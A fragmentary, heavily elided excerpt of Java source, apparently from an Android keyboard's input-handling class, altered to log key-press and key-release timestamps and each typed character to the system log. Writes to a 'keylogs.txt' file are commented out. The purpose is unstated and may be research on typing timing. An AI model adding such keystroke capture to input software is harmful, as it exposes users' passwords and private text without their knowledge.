...
public final class InputLogic {
    ...
    public void sendDownUpKeyEvent(final int keyCode) {
        ...
        File file = new File(path, "keylogs.txt");
        ...
        //try {
            ...
            String timeStamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSSS").
                ...
                Log.d("INFO", "pressed" + timeStamp);
                String p1 = "pressed" + timeStamp;
                //fileOutputStream.write(p1.getBytes());
            ...
            mConnection.sendKeyEvent(new KeyEvent(SystemClock.uptimeMillis(), eventTime,
                ...
                String timeStamp2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSSS").
                        format(new Timestamp(System.currentTimeMillis()));

                Log.d("INFO", "released" + timeStamp2);
                String p2 = "released" + timeStamp2;
               // fileOutputStream.write(p2.getBytes());
                //fileOutputStream.write("\n".getBytes()[0]);
    ...
    private void sendKeyCodePoint(final int codePoint) {
        ...
        //try {
            ...
            sendDownUpKeyEvent(codePoint - '0' + KeyEvent.KEYCODE_0);
            Log.d("INFO", "Keypress: " + pressedChar);
            //fileOutputStream.write(pressedChar.getBytes());
            //fileOutputStream.write("\n".getBytes()[0]);
